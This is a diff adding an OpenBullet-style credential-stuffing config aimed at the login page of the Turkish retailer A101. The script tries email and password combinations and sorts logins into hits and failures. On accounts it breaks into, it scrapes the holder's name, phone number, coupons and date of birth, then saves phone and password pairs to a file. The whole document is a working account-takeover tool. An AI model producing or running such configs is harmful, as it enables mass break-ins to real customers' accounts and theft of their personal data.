@@ -1,0 +1,81 @@
+[SETTINGS]
+{
+  "Name": "A-101 v0.2",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-10-05T14:19:39.8362096+03:00",
+  "AdditionalInfo": "",
+  "Author": "BlackinOne",
+  "Version": "1.4.1 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#GİRİS_BlackinOne REQUEST POST "https://www.a101.com.tr/users/login/" 
+  CONTENT "email=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#KONTROL_BlackinOne KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"key\":" 
+  KEYCHAIN Failure OR 
+    KEY "{\"non_field_errors\":[\"E-posta veya ÅŸifre hatalÄ±.\"]}" 
+
+#TELEFON_BlackinOne REQUEST GET "https://www.a101.com.tr/account/profile/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#İSİM_BlackinOne PARSE "<SOURCE>" LR "\"name\": \"" "\"," -> CAP "User İsmi " 
+
+#TELEFON_BlackinOne PARSE "<SOURCE>" LR "<input type=\"text\" name=\"phone\" class=\"js-phone-number-mask\" value=\"" "\" placeholder=" -> CAP "Telefon Nunarası " 
+
+#KUPON_BlackinOne PARSE "<SOURCE>" LR "<div class=\"no-coupon account-coupons__no-coupons hide\">" "</div>" -> CAP "Kuponu " 
+
+#DOGUMTARİHİ_BlackinOne PARSE "<SOURCE>" LR "<input type=\"text\" name=\"date_of_birth\" value=\"" "\">" -> CAP "Doğum Tarihi " 
+
+FUNCTION RandomString "?h?h?h?h?h?h" -> VAR "<random>" 
+
+#TEL_PAS_İCİN UTILITY File "TR TEL PASS A101<random>.txt" AppendLines "<Telefon Nunarası>:<PASS>" 
+
